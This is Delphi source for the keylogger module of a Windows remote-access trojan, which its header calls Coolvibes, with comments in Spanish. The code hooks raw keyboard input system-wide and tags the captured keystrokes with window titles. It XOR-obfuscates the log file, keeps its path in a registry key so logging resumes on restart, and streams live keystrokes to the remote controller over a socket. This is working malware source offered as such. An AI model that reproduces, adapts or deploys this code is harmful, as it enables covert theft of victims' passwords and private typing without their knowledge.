{Unit perteneciente al troyano Coolvibes que contiene el modulo keylogger}

unit UnitKeylogger;

interface

uses
  Windows,
  Messages,
  UnitWindows,
  SocketUnit,
  UnitVariables,
  minireg,
  UnitFunciones,
  UnitSystemInfo,
  classes,
  Sysutils;

var
  ThreadStarted        : boolean;
    
type
  USHORT = Word;

////////////////////////////////////////////////////////////////////////////////

const
  RI_NUM_DEVICE = 1;

const
  WM_INPUT  = $00FF;
const
  RIDEV_REMOVE                = $00000001;
  RIDEV_EXCLUDE               = $00000010;
  RIDEV_PAGEONLY              = $00000020;
  RIDEV_NOLEGACY              = $00000030;
  RIDEV_INPUTSINK             = $00000100;
  RIDEV_CAPTUREMOUSE          = $00000200;
  RIDEV_NOHOTKEYS             = $00000200;
  RIDEV_APPKEYS               = $00000400;

  RIM_TYPEMOUSE               = $00000000;
  RIM_TYPEKEYBOARD            = $00000001;
  RIM_TYPEHID                 = $00000002;

  RID_INPUT                   = $10000003;
  RID_HEADER                  = $10000005;

  RIDI_PREPARSEDDATA          = $20000005;
  RIDI_DEVICENAME             = $20000007;
  RIDI_DEVICEINFO             = $2000000b;

////////////////////////////////////////////////////////////////////////////////

type
  TRAWINPUTDEVICE = packed record
    usUsagePage : WORD;
    usUsage     : WORD;
    dwFlags     : DWORD;
    hwndTarget  : HWND;
  end;
  PRAWINPUTDEVICE = ^TRAWINPUTDEVICE;

  TRAWINPUTHEADER = packed record
    dwType    : DWORD;
    dwSize    : DWORD;
    hDevice   : THANDLE;
    wParam    : WPARAM;
  end;
  PRAWINPUTHEADER = ^TRAWINPUTHEADER;

  TRAWKEYBOARD = packed record
    MakeCode         : SHORT;
    Flags            : SHORT;
    Reserved         : SHORT;
    VKey             : SHORT;
    Mess             : UINT;
    ExtraInformation : ULONG;
  end;
  PRAWKEYBOARD = ^TRAWKEYBOARD;


  TRAWINPUTDATA = packed record
    case Integer of
      1:(keyboard : TRAWKEYBOARD);
    end;

  TRAWINPUT = packed record
      header  : TRAWINPUTHEADER;
      data    : TRAWINPUTDATA;
  end;
  PRAWINPUT = ^TRAWINPUT;

  TRID_DEVICE_INFO_MOUSE = packed record
     dwId               : DWORD;
     dwNumberOfButtons  : DWORD;
     dwSampleRate       : DWORD;
  end;
  PRID_DEVICE_INFO_MOUSE = ^TRID_DEVICE_INFO_MOUSE;

  TRID_DEVICE_INFO_KEYBOARD = packed record
     dwType : DWORD;
     dwSubType              : DWORD;
     dwKeyboardMode         : DWORD;
     dwNumberOfFunctionKeys : DWORD;
     dwNumberOfIndicators   : DWORD;
     dwNumberOfKeysTotal    : DWORD;
  end;
  PRID_DEVICE_INFO_KEYBOARD = ^TRID_DEVICE_INFO_KEYBOARD;

  TRID_DEVICE_INFO_HID  = packed record
     dwVendorId       : DWORD;
     dwProductId      : DWORD;
     dwVersionNumber  : DWORD;
     usUsagePage      : USHORT;
     usUsage          : USHORT;
     end;
  PRID_DEVICE_INFO_HID = ^TRID_DEVICE_INFO_HID;

  TRID_DEVICE_INFO = packed record
      cbSize : DWORD;
      dwType : DWORD;
      case Integer of
        0:(mouse    : TRID_DEVICE_INFO_MOUSE   );
        1:(keyboard : TRID_DEVICE_INFO_KEYBOARD);
        2:(hid      : TRID_DEVICE_INFO_HID     );
  end;
  PRID_DEVICE_INFO = ^TRID_DEVICE_INFO;

////////////////////////////////////////////////////////////////////////////////

function RegisterRawInputDevices(pRawInputDevices: Pointer;uiNumDevices,cbSize: UINT): Boolean; stdcall; external 'user32.dll';
function GetRawInputData(hRawInput: Pointer; uiCommand:UINT; pData: Pointer; pcbSize: Pointer; cbSizeHeader: UINT): UINT; stdcall; external 'user32.dll';
function GetRawInputDeviceInfoA(hDevice: THandle; uiCommand:UINT; pData: Pointer; pcbSize: Pointer): UINT; stdcall; external 'user32.dll';

////////////////////////////////////////////////////////////////////////////////

  type
   TMSGH = class
       procedure CallBack(var Msg: TMessage);
   end;

  procedure OnServerInitKeylogger();//Al iniciar el servidor...
  procedure EmpezarKeylogger(ArchivoLog:string); //Empezar a "loggear" teclas
  procedure SetOnlineKeylogger(status:boolean;client:TclientSocket);   //activar o desactivar online keylogger
  procedure PararKeylogger();                    //Parar de "loggear" teclas
  function  ObtenerEstadoKeylogger():boolean;     //Para saber si está activado o desactivado
  function  ObtenerLog():string;                  //devuelve el log
  function  GetOnlineKeyloggerKeys():string;  //Las nuevas letras pulsadas
  procedure EliminarLog();                       //Eliminar el log del keylogger
  procedure KlogThread();                        //thread principal del keylogger
  procedure KeyStart();                           
  function  GetKeyloggerPath():string;
  procedure AgregarVKeyALog(K:cardinal);
  function XorLog(s:string):string;   //Cifra/descifra el log del keylogger


implementation
var
  KeyloggerActivado    : boolean;
  KeyloggerPath        : string;
  AccediendoKeylogger  : boolean; //saber si se intenta acceder al archivo
  TeclasPulsadas       : string;  //teclas pulsadas, se eliminan al guardar el log
  lasttickcount        : integer; //última vez guardado
  lasttickcountv       : integer; //última vez guardado
  id1                  : longword;
  id2                  : longword;
  Evento               : string;
  SubEvento            : string;
  CapturarTecla        : string;
  HookHandle           : HHook;
  JHHandle             : HHook;
  lpMsg                : TMsg;       
  letraanterior        : integer;
  OKeyloggerActivado   : Boolean;  //Estado del online keylogger
  OnlineKeyloggerKeys  : string;
  lasttickcounton      : integer; //Ultima vez mandadas teclas del online keylogger
  Cliente              : TClientSocket;
  MSGH                 : TMSGH;

procedure OnServerInitKeylogger();//Al iniciar el servidor...
var
tmp : string;
begin
  RegGetString(HKEY_CURRENT_USER, 'Software\'+Configuracion.sID+'\'+Configuracion.sID, tmp);
  if(tmp <> '') then
    empezarkeylogger(tmp); //Empezamos
end;


procedure EmpezarKeylogger(ArchivoLog:string);
begin
  KeyloggerPath := ExtractFilePath(Paramstr(0))+ArchivoLog;
  RegSetString(HKEY_CURRENT_USER,'Software\'+Configuracion.sID+'\'+Configuracion.sID, extractfilename(KeyloggerPath));

  if not ThreadStarted then
  begin
    ThreadStarted  := true;
    BeginThread(nil,0,Addr(KlogThread),nil,0,id1);
    BeginThread(nil,0,Addr(KeyStart),nil,0,id2);
  end;
  KeyloggerActivado := true;
end;

procedure SetOnlineKeylogger(status:boolean;client:TclientSocket);  //activar o desactivar online keylogger
begin
  OKeyloggerActivado := status;
  if(status = false) then OnlineKeyloggerKeys := '' else Cliente := client;
end;

function GetOnlineKeyloggerKeys():string;  //Las nuevas letras pulsadas
begin
  Result := OnlineKeyloggerKeys;
  OnlineKeyloggerKeys := '';
end;

procedure PararKeylogger();
begin
  KeyloggerActivado := false;
  KeyloggerPath := '';
  UnhookWindowsHookEx(HookHandle);
  HookHandle := 0;
  RegSetString(HKEY_CURRENT_USER,'Software\'+Configuracion.sID+'\'+Configuracion.sID, '');
end;

function ObtenerEstadoKeylogger():boolean;
begin
  Result := KeyloggerActivado;
end;

function GetKeyloggerPath():string;
begin
  Result := KeyloggerPath;
end;

function ObtenerLog():string;
var
  KlogFile : file;
  Tamano   : integer;
begin

  while(AccediendoKeylogger) do sleep(1);
  AccediendoKeylogger := true;
  if(fileexists(KeyloggerPath)) then
  begin
    FileMode := 0;  //fmopenread
    AssignFile(KlogFile, KeyloggerPath);
    Reset(KlogFile, 1);
    tamano := FileSize(KlogFile);
    SetLength(Result, tamano);
    BlockRead(KlogFile, Result[1], tamano);
    CloseFile(KlogFile);
  end;


  AccediendoKeylogger := false;

  Result := XorLog(Result) + TeclasPulsadas;

  if(Result = '') then Result := 'Vacio';
end;

procedure EliminarLog();
begin
  while AccediendoKeylogger do sleep(1);
  if(fileexists(KeyLoggerPath)) then
    DeleteFile(KeyloggerPath);
end;

function XorLog(s:string):string;
var
  i: integer;
begin
 Result:='';
   for i:=1 to Length(s) do
       result:=result+Chr(Byte(s[i]) xor 1337);
end;


procedure GuardarLog();
var
  KlogFile : textfile;
  tamano   : integer;
  Tmp : string;
begin                                                                 {cada 30 segundos}
  if((Length(TeclasPulsadas) = 0) or ((GetTickCount()-lasttickcount) < 30000)) then exit;  //Nos vamos :p
  lasttickcount := GetTickCount();
  while(AccediendoKeylogger) do sleep(1);    //Esperamso a que acabe
  AccediendoKeylogger := true;


  AssignFile(KlogFile, KeyloggerPath);
  if fileexists(KeyloggerPath) then
  begin
    Append(KlogFile); //vamos al final...
  end
  else
    Rewrite(KlogFile);
  Tmp := XORLOG(Teclaspulsadas);
  Write(KlogFile, Tmp);
  CloseFile(KlogFile);

  TeclasPulsadas := '';//Las borramos
  AccediendoKeylogger := false;
end;


procedure KlogThread();
var
  Tecla : String;
  TituloVentana : string;
  TempTituloVentana    : string;
begin
  Evento := 'Keylogger Iniciado';
  SubEvento := 'PC encendido hace: '+GetUptime;
  
  while true do
  begin
    if(KeyloggerActivado) then
    begin

      if((gettickcount-lasttickcountv) > 100) then
      begin
          lasttickcountv := GetTickCount();
          TempTituloVentana := GetActiveWindowCaption;
      end;
      Tecla := '';
      Tecla := CapturarTecla;
      CapturarTecla := '';

      if ((Tecla <> '') and (TempTituloVentana <> TituloVentana) and (TemptituloVentana <> '')) then  //Si se pulsa tecla y cambia de ventana
      begin
        TeclasPulsadas := TeclasPulsadas +#13#10#13#10+'-{'+TempTituloVentana+'}-'+DateTimeToStr(now)+#13#10+Tecla;
        TituloVentana := TempTituloVentana;
        if(OKeyloggerActivado) then
          OnlineKeyloggerKeys := OnlineKeyloggerKeys+#13#10#13#10+'-{'+TempTituloVentana+'}-'+DateTimeToStr(now)+#13#10+Tecla;
      end
      else
      if(Tecla <> '') then
      begin
        TeclasPulsadas := TeclasPulsadas + Tecla;
        if(OKeyloggerActivado) then
          OnlineKeyloggerKeys := OnlineKeyloggerKeys + Tecla;
      end;
     
        if(Evento <> '') then
        begin
          TeclasPulsadas := TeclasPulsadas +#13#10#13#10+'-['+Evento+']- '+DateTimeToStr(now)+#13#10+SubEvento+#13#10;
          Evento := '';
          SubEvento := '';
        end;

      sleep(80);

       if(OKeyloggerActivado and ((GetTickCount()-lasttickcounton) > 500)) then  //Enviamos la teclas nuevas maximo cada 500 ms para no saturar la conexión
       begin
        lasttickcounton := GetTickCount();
          if(OnlineKeyloggerKeys <> '') then //Teclas nuevas del online keylogger :D
          begin
             OnlineKeyloggerKeys:= StringReplace(OnlineKeyloggerKeys,#10, '|salto|', [rfReplaceAll]);   //Para que lo envie todo de una vez
            OnlineKeyloggerKeys := StringReplace(OnlineKeyloggerKeys,#13, '|salto2|', [rfReplaceAll]);
            OnlineKeyloggerKeys := StringReplace(OnlineKeyloggerKeys,' ', '|espacio|', [rfReplaceAll]); //Para evitar el trim( final
            if(Cliente.Connected) then
              Cliente.SendString('NEWKEYLOGKEYS|'+OnlineKeyloggerKeys+ ENTER)
            else
              OKeyloggerActivado := false;
            OnlineKeyloggerKeys := '';
          end;
       end;
      GuardarLog();//Guardamos el log
    end
    else
    sleep(100); //Esperamos un poco...
  end;
end;


procedure KeyStart();
var
  Rid: packed array [0..RI_NUM_DEVICE-1] of TRAWInputDevice;
  Handle : THandle;
  Msg: TMsg;
begin
  Handle := Classes.AllocateHWnd(MSGH.CallBack); //Registramos una ventana para recibir mensages

  Rid[0].usUsagePage := $0001;
  Rid[0].usUsage     := $06;         
  Rid[0].dwFlags     := RIDEV_INPUTSINK;
  Rid[0].hwndTarget  := Handle;
  RegisterRawInputDevices(@Rid, RI_NUM_DEVICE, SizeOf(TRAWInputDevice));
  
  while (GetMessage(Msg, 0, 0, 0)) do
    begin                                         
      TranslateMessage(Msg);
      DispatchMessage(Msg);
    end;    
end;

procedure  AgregarVKeyALog(K:cardinal);
var
  Tecla        : String;
  ScanCode     : integer;
  nametext     : array[0..32] of Char;
  Charry       : array[0..1] of Char;
  KeyState     : TKeyboardState;
  RetCode      : Integer;
begin
    Scancode := MapVirtualKey(K, 0);
    Scancode := Scancode shl 16;
    GetKeyNameText(Scancode, nametext, sizeof(nametext)); //conseguimos el nombre de la tecla si lo tiene
    
    Tecla := #0;
    FillChar(Charry,2,#0);
    if K = VK_CAPITAL then Tecla := #0
    else if K = VK_SPACE then Tecla := ' '
    else if K = VK_SHIFT then Tecla := '[Shift]'
    else if K = VK_RETURN then Tecla := #13#10 
    else if lstrlen(nametext) > 1 then Tecla := '[' + nametext+']'
    else
    begin
      case K of
        //Letras
        65: Tecla := 'A';
        66: Tecla := 'B';
        67: Tecla := 'C';
        68: Tecla := 'D';
        69: Tecla := 'E';
        70: Tecla := 'F';
        71: Tecla := 'G';
        72: Tecla := 'H';
        73: Tecla := 'I';
        74: Tecla := 'J';
        75: Tecla := 'K';
        76: Tecla := 'L';
        77: Tecla := 'M';
        78: Tecla := 'N';
        79: Tecla := 'O';
        80: Tecla := 'P';
        81: Tecla := 'Q';
        82: Tecla := 'R';
        83: Tecla := 'S';
        84: Tecla := 'T';
        85: Tecla := 'U';
        86: Tecla := 'V';
        87: Tecla := 'W';
        88: Tecla := 'X';
        89: Tecla := 'Y';
        90: Tecla := 'Z';
      end;
      


      if ((((GetKeyState(VK_CAPITAL))=1) and (GetKeyState(VK_SHIFT) < 0)) or ((((GetKeyState(VK_CAPITAL))<>1) and (GetKeyState(VK_SHIFT) >= 0)) )) then
        Tecla := Lowercase(Tecla);

      if tecla = #0 then
      begin
        Win32Check(GetKeyboardState(keystate)) ;
        SetLength(Tecla, 2) ;
        if ToAscii(K, MapVirtualKey(K, 0), KeyState, @Tecla[1], 0)=1 then
          SetLength(Tecla, 1)
        else
          Tecla := '';
      end;
    end;  

    CapturarTecla := CapturarTecla+Tecla;                  
end;

procedure TMSGH.Callback(var msg: TMessage);
var
  RI: PRAWINPUT;
  dwSize: UINT;
  lpb: PBYTE;
  DataSize: DWORD;
begin
  GetRawInputData(PRAWINPUT(msg.LParam), RID_INPUT, nil, @dwSize,SizeOf(TRAWINPUTHEADER));
  if dwSize = 0 then Exit;
  
  DataSize := SizeOf(BYTE) * dwSize;
  GetMem(lpb,DataSize);
  try
    GetRawInputData(PRAWINPUT(msg.LParam), RID_INPUT, lpb, @dwSize, SizeOf(TRAWINPUTHEADER));
    RI := PRAWINPUT(lpb);
    if RI.header.dwType = RIM_TYPEKEYBOARD then
      if RI.Data.keyboard.Mess = 256 then   //Keydown
        AgregarVKeyALog(Ri.data.keyboard.VKey);

  finally
    FreeMem(lpb,DataSize);
  end;
end;

end.


end.